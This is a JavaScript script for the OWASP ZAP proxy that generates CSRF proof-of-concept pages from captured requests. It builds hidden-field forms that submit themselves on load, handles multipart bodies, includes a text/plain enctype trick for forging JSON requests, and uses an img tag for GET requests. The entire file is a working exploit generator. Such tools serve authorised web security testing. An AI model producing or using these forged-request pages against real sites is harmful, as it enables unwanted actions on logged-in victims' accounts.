//csrf poc generater supporting json csrf
//also supports multipart/form-data.
//it will copy the results to clipboard and print them to the zap script console
// released under the Apache v2.0 licence.
//You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
//Author : @haseebeqx

function invokeWith(msg) {
	string = "<!DOCTYPE html>\n";
	string += "<head>\n <title>CSRF POC</title>\n</head>";
	string += "\n<body>";
	if(msg.getRequestHeader().getMethod()== "POST"){
	body = msg.getRequestBody().toString();
	body = body.trim();
	if(isJson(body))
		string += "\n<form action=\""+ msg.getRequestHeader().getURI().toString() +"\" id=\"formid\" method=\"post\" enctype=\"text/plain\">" ;
	else{
		if(ismultipart(msg.getRequestHeader()))
			string += "\n<form action=\""+ msg.getRequestHeader().getURI().toString() +"\" id=\"formid\" enctype=\"multipart/form-data\" method=\"post\">";
		else
			string += "\n<form action=\""+ msg.getRequestHeader().getURI().toString() +"\" id=\"formid\" method=\"post\">";
	}
	if(body.length()!=0)
	if(!isJson(body)){	
	if(ismultipart(msg.getRequestHeader())){
		type 	=  msg.getRequestHeader().getHeader(org.parosproxy.paros.network.HttpRequestHeader.CONTENT_TYPE);
		delim 	=  type.substring(type.search("=")+1,type.length());
		h = body.split("--"+delim);
		k=0;
		names = [];
		values = [];
		for(i =1 ; i<h.length-1;i++){
			j = h[i].split(msg.getRequestHeader().getLineDelimiter());
			nameField =j[1].substring( j[1].search("name")+5,j[1].length());
			start = nameField.indexOf("\"")+1;
			end = nameField.indexOf("\"",start);
			names[k] = nameField.substring(start,end);
			for(ii=2;ii<j.length-1;ii++){
				if(j[ii].length() == 0) //find a blank line
					break;
			}
			values[k] = "";
			if(ii != j.length-1)
				while(ii < j.length-1){
					values[k] += j[ii+1]+msg.getRequestHeader().getLineDelimiter();
					ii++;
				}
				values[k] = values[k].substring(0,values[k].length-1);
			k++;		
		}
		for(i=0; i < k;i++)
			string	+= "\n<input type=\"hidden\" name=\""+names[i]+"\" value=\""+values[i]+"\" />";
	}
	else{
	body=body.split('&');
	for(i=0;i<body.length;i++)
	{
		keyval = body[i].split('=')
		string += "\n<input type=\"hidden\" name=\""+decodeURIComponent(keyval[0])+"\" value=\""+decodeURIComponent(keyval[1])+"\" />";	
	}
	}
	}
	else{
		string += "\n<input type ='hidden' name='"+body.substring(0,body.length()-1)+",\"ignore_me\":\"' value='something\"}'>"
	}
	string += "\n</form>";
	string += "\n<script>document.getElementById('formid').submit();</script>";
	}
	else if(msg.getRequestHeader().getMethod()== "GET"){
	string += "\n<img src=\""+msg.getRequestHeader().getURI().toString()+"\">";
	}
	string += "\n</body></html>";
	print("\n\n\n");
	print(string);
	selected = new java.awt.datatransfer.StringSelection(string);
	clipboard = java.awt.Toolkit.getDefaultToolkit().getSystemClipboard();
	clipboard.setContents(selected,null);
	
}

function isJson(str)
{
	try{
		JSON.parse(str);
	}
	catch(e){
		return false;
	}
		return true;
}

function ismultipart(header){
	type = header.getHeader(org.parosproxy.paros.network.HttpRequestHeader.CONTENT_TYPE);
	if(type == null )
		return false;
	if(type.contains("multipart/form-data"))
			return true;
	return false;
}
